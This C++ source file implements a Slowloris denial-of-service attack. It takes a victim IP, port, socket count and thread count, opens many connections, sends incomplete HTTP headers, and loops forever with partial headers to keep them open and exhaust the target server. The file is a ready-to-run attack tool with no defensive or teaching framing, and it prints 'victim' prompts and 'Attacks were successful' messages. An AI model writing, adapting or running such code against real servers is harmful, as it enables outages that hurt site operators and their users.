// Updated: slowloris_attack.cpp
//Bakr Alkhalidi

#include <stdio.h>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>
#include <vector>
#include <unistd.h>
#include <thread>

using namespace std;

int ARGS = 4;

//sends incomplete HTTP headers to simulate slowloris

void initialSendSocket(int socketNum) {
    char incompleteHeader[255];
    snprintf(incompleteHeader, sizeof(incompleteHeader), "GET /%d HTTP/1.1\r\n", rand() % 99999);
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    snprintf(incompleteHeader, sizeof(incompleteHeader), "Host: \r\n");
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    snprintf(incompleteHeader, sizeof(incompleteHeader), "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\r\n");
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
    snprintf(incompleteHeader, sizeof(incompleteHeader), "Content-Length: %d\r\n", (rand() % 99999 + 1000));
    send(socketNum, incompleteHeader, strlen(incompleteHeader), 0);
}

//sends partical headers to keep conectiona live
void spamPartialHeaders(struct sockaddr_in victim, vector<int> socketList, int totalSockets) {
    for (int i = 0; i < totalSockets; i++) {
        try {
            char partialHeader[50];
            snprintf(partialHeader, sizeof(partialHeader), "X-a: %d\r\n", rand() % 99999);
            send(socketList.at(i), partialHeader, strlen(partialHeader), 0);
        } catch (exception e) {
            socketList.erase(socketList.begin() + i);
            socketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
            connect(socketList.at(totalSockets - 1), (struct sockaddr*) &victim, sizeof(victim));
            initialSendSocket(socketList.at(i));
        }
    }
}
// Entry point of the attack program
int main(int argc, char* argv[]) {
    if (argc != (ARGS + 1)) {
        cerr << "arg 1: VICTIM IP" << endl;
        cerr << "arg 2: VICTIM PORT NUM" << endl;
        cerr << "arg 3: NUM OF SOCKETS" << endl;
        cerr << "arg 4: NUM OF THREADS" << endl;
        cerr << "Usage: ./slowlorisattack <dest_ip> <dest_port_num> <num_sockets> <num_threads>" << endl;
        return 0;
    }

    const char* victimIP = argv[1];
    unsigned short victimPORT = atoi(argv[2]);
    int totalSockets = atoi(argv[3]);
    int numThreads = atoi(argv[4]);
    std::vector<std::thread> threadArray(numThreads);

    int socketDensity = totalSockets / numThreads;
    vector<vector<int>> socketListPartitions;

    struct sockaddr_in victim;
    victim.sin_family = AF_INET;
    victim.sin_port = htons(victimPORT);
    inet_pton(AF_INET, victimIP, &victim.sin_addr);

//setup sockets for each thread
    for (int i = 0; i < numThreads; i++) {
        vector<int> currentSocketList;
        int numSockets = ((i == (numThreads - 1)) ? (socketDensity + totalSockets % numThreads) : socketDensity);
        for (int j = 0; j < numSockets; j++) {
            currentSocketList.push_back(socket(AF_INET, SOCK_STREAM, 0));
            if (currentSocketList.at(j) < 1) {
                cout << "Could not create socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
                return 0;
            }
            cout << "Successfully created socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
            int check = connect(currentSocketList.at(j), (struct sockaddr*) &victim, sizeof(victim));
            if (check < 0) {
                cout << "Cannot connect socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
                cout << "Maybe a nonexistent IP or unopened port?" << endl;
                return 0;
            }
            cout << "Successfully connected socket " << j + 1 << " for thread #" << i + 1 << "." << endl;
            initialSendSocket(currentSocketList.at(j));
            cout << "Successfully sent incomplete header for socket " << j + 1 << " on thread #" << i + 1 << "." << endl;
        }
        socketListPartitions.push_back(currentSocketList);
        cout << "--------" << endl;
    }

    cout << "------------------" << endl;
    int iterations = 1;
    while (true) {
        cout << "Restarting attacks.." << endl;
        for (int i = 0; i < numThreads; i++) {
            cout << "Keeping sockets on thread #" << i + 1 << " open.." << endl;
            threadArray[i] = thread(spamPartialHeaders, victim, socketListPartitions.at(i), (socketListPartitions.at(i).size()));
            cout << "Attacks were successful on thread #" << i + 1 << "." << endl;
        }
        for (int i = 0; i < numThreads; i++) {
            threadArray[i].join();
            cout << "Attacks on thread #" << i + 1 << " paused." << endl;
        }
        cout << "Iteration " << iterations << " completed." << endl;
        iterations++;
        cout << "Sleeping for 15 sec..." << endl;
        sleep(15); //delay between partial sends to simulat slow connection
        cout << "----------" << endl;
    }
}


